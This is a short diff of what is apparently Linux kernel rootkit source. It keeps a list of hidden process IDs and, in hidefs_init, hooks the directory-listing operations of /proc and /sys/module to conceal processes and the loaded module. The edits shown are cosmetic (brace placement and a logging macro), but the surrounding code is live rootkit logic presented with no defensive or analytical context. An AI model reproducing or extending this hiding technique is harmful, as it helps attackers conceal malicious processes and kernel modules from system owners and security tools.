@@ -4,7 +4,8 @@ extern u8 module_hidden;
 
 LIST_HEAD(hidden_pid_list);
 
-struct hidden_pid_t {
+struct hidden_pid_t
+{
     pid_t pid;
     struct list_head list;
 };
@@ -60,7 +61,7 @@ int rk_sys_iterate_shared(struct file *file, struct dir_context *ctx)
 
 int hidefs_init(void)
 {
-    pr_info("Init hidefs");
+    FM_INFO("Init hidefs");
     SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
     SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);
 
